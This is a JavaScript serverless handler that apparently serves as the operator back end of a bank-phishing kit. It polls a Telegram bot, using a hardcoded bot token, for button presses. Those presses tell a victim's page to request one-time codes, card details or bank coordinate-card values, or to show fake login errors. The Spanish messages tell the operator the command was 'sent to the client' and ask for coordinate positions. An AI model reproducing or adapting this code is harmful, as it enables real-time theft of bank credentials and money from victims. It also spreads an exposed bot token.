const TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  try {
    const { offset, init, waitCoords } = req.query;
    const esperandoCoords = waitCoords === 'true';

    if (init === 'true') {
      const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?timeout=0&offset=-1`);
      const d = await r.json();
      let lastId = 0;
      if (d.ok && d.result.length) {
        lastId = d.result[d.result.length - 1].update_id;
        await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastId + 1}&timeout=0`);
      }
      return res.status(200).json({ ok: true, update_id: lastId });
    }

    const useOffset = offset ? parseInt(offset) + 1 : 0;

    const r = await fetch(
      `https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${useOffset}&timeout=3&allowed_updates=["callback_query","message"]`
    );
    const data = await r.json();

    if (!data.ok || !data.result.length) {
      return res.status(200).json({ ok: true, action: null, update_id: useOffset - 1 });
    }

    for (const update of data.result) {
      const lastId = update.update_id;

      // ── MENSAJE DE TEXTO: solo procesar si estamos esperando coords ──
      if (update.message?.text) {
        const txt = update.message.text.trim();
        if (txt.startsWith('/')) continue;

        if (esperandoCoords) {
          const parts = txt.toUpperCase().split(/\s+/);
          if (parts.length >= 2) {
            return res.status(200).json({
              ok: true,
              action: 'bancontrol',
              coords: [parts[0], parts[1]],
              waitCoords: false,
              update_id: lastId
            });
          }
        }
        continue;
      }

      // ── CALLBACK QUERY ──
      const cb = update.callback_query;
      if (!cb) continue;
      const cbData = cb.data;

      await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ callback_query_id: cb.id, text: "✅ Enviado al cliente" }),
      });

      if (cbData === "bancontrol") {
        // Pedirle al operador las coords y activar modo espera
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: cb.message.chat.id,
            text: `🏦 *BANCONTROL*\n\nEscribe las 2 coordenadas separadas por espacio:\n\nEjemplo: \`D1 D2\` o \`A3 B7\``,
            parse_mode: "Markdown",
          }),
        });
        // Decirle al cliente que siga esperando en modo waitCoords
        return res.status(200).json({ ok: true, action: null, waitCoords: true, update_id: lastId });
      }

      if (cbData === "otp")              return res.status(200).json({ ok: true, action: "otp",              update_id: lastId });
      if (cbData === "tarjeta")          return res.status(200).json({ ok: true, action: "tarjeta",          update_id: lastId });
      if (cbData === "error_login")      return res.status(200).json({ ok: true, action: "error_login",      update_id: lastId });
      if (cbData === "error_otp")        return res.status(200).json({ ok: true, action: "error_otp",        update_id: lastId });
      if (cbData === "error_tarjeta")    return res.status(200).json({ ok: true, action: "error_tarjeta",    update_id: lastId });
      if (cbData === "error_bancontrol") return res.status(200).json({ ok: true, action: "error_bancontrol", update_id: lastId });
      if (cbData === "finalizar")        return res.status(200).json({ ok: true, action: "finalizar",        update_id: lastId });
    }

    return res.status(200).json({ ok: true, action: null, update_id: useOffset - 1 });

  } catch (err) {
    return res.status(500).json({ ok: false, action: null, error: err.message });
  }
}
